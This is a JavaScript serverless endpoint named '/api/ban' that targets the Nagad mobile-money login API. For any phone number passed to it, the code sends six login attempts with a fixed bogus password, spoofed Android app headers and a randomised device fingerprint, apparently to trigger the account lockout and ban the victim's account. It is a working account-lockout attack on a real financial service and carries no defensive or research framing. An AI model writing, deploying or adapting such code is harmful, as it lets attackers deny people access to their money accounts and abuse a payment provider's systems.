import crypto from "crypto";

const BASE_URL = "https://app2.mynagad.com:20002/api/login";
const ASP_ID = "100012345612345";
const PASSWORD = "D885BCA1F73F287E925BDBF235C9452B34A76F4208A1FBE6BD40E659BE2C843B";

function generateFgp() {
  const seed = `${Math.random()}-${Date.now()}-${crypto.randomUUID()}`;
  return crypto.createHash("sha256").update(seed).digest("hex").toUpperCase();
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function nagadLogin(num, fgp) {
  const payload = JSON.stringify({
    aspId: ASP_ID,
    mpaId: null,
    password: PASSWORD,
    username: num,
  });

  const headers = {
    Host: "app2.mynagad.com:20002",
    "User-Agent": "okhttp/5.0.0-alpha.7",
    Connection: "Keep-Alive",
    "X-KM-UserId": "99280234",
    "X-KM-User-AspId": ASP_ID,
    "X-KM-User-Agent": "ANDROID/1218",
    "X-KM-DEVICE-FGP": fgp,
    "X-KM-Accept-language": "bn",
    "X-KM-AppCode": "01",
    "Content-Type": "application/json; charset=UTF-8",
  };

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 15000);

  try {
    const res = await fetch(BASE_URL, {
      method: "POST",
      headers,
      body: payload,
      signal: controller.signal,
    });

    const rawText = await res.text();
    let parsedBody = rawText;
    try {
      parsedBody = JSON.parse(rawText);
    } catch {
      // JSON না হলে raw text রাখবে
    }

    return { status: res.status, body: parsedBody };
  } catch (err) {
    return { status: 0, body: { error: err.message } };
  } finally {
    clearTimeout(timeout);
  }
}

export default async function handler(req, res) {
  const rawNum = req.query?.num ? String(req.query.num) : "";
  const num = rawNum.replace(/\D/g, "");

  if (!num) {
    return res.status(400).json({
      error: "num parameter missing. Use /api/ban?num=017XXXXXXXX",
    });
  }

  const results = [];

  for (let i = 1; i <= 6; i++) {
    const fgp = generateFgp();
    const { status, body } = await nagadLogin(num, fgp);

    results.push({
      attempt: i,
      status_code: status,
      device_fgp: fgp,
      response: body,
      time: new Date().toISOString().replace("T", " ").slice(0, 19),
    });

    if (i < 6) {
      await sleep(1000);
    }
  }

  return res.status(200).json({
    num,
    total_attempts: results.length,
    results,
  });
}
